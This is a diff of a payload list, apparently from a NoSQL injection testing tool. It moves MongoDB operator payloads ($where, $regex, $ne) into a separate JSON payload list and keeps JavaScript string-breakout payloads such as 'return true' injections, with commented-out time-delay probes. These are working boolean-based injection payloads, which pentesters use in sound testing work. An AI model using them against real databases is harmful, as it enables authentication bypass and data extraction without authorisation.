@@ -77,11 +77,7 @@ bool_payloads = [
     ["a\\';return true;var xyz='a", "a\\';return §inject§;var xyz='a"],
     ["a\";return true;var xyz=\"a", "a\";return §inject§;var xyz=\"a"], #only extraction tested
     ["0;return true", "0;return §inject§"],
-    [{"$where":"1==1"}, {"$where":"§inject§"}],
-    [{"$where":"\'1\'==\'1\'"}, {"$where":"§inject§"}],
-    [{"$regex":"^.*"}, {"$regex":"^§brute§.*"}],
     [',"$ne":""', None],
-    [{"$ne":""}, None]
     #"require('os').endianness()=='LE'",
     # "var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1",
     # "1;var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1",
@@ -90,3 +86,9 @@ bool_payloads = [
     #"_security",
 ]
 
+bool_json_payloads = [
+    [{"$where":"1==1"}, {"$where":"§inject§"}],
+    [{"$where":"\'1\'==\'1\'"}, {"$where":"§inject§"}],
+    [{"$regex":"^.*"}, {"$regex":"§regex_brute§"}],    
+    [{"$ne":""}, None]
+]
